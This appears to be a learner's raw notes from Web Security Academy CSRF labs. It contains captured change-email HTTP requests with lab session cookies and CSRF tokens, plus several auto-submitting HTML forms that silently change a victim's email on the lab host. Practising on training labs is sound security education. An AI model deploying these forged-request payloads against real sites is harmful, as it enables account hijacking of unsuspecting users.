POST /my-account/change-email HTTP/2
Host: 0a90009e047a2bce86637c47002800bd.web-security-academy.net
Cookie: session=QZGaVguWh2GV6kkJyFAaS9ReUg9pljgN
Content-Length: 59
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://0a90009e047a2bce86637c47002800bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a90009e047a2bce86637c47002800bd.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

email=sama%40user.com&csrf=zmuFAgmZGbXRl3gwTDXotKkv0EkFbC4L

lab1:
<form method="POST" action="https://acfe1fd91fd1c3bbc0ab31e600dd00d6.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="csrf-success@test.com"></form>
<script>
document.forms[0].submit();
</script>

lab2:
<form method="GET" action="https://0a90009e047a2bce86637c47002800bd.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="hahlol@test.com"></form>
<script>
document.forms[0].submit();
</script>

lab3:
POST /my-account/change-email HTTP/2
Host: 0ab500f40407c4b78105c59e00ca00cd.web-security-academy.net
Cookie: session=pOlBT77s73tk97k7qJagbV4ySDqFEDvA
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://0ab500f40407c4b78105c59e00ca00cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab500f40407c4b78105c59e00ca00cd.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

email=sam%40user.com&csrf=Bk4vcGyNatV3MDFU9oDYzvbAuz9aR6RI

required fields :
POST /my-account/change-email HTTP/2
Host: 0ab500f40407c4b78105c59e00ca00cd.web-security-academy.net
Cookie: session=pOlBT77s73tk97k7qJagbV4ySDqFEDvA
Content-Length: 58
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/
email=sam%40user.com&csrf=Bk4vcGyNatV3MDFU9oDYzvbAuz9aR6RI


<form method="POST" action="https://acfe1fd91fd1c3bbc0ab31e600dd00d6.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="csrf-success@test.com"></form>
<script>
document.forms[0].submit();
</script>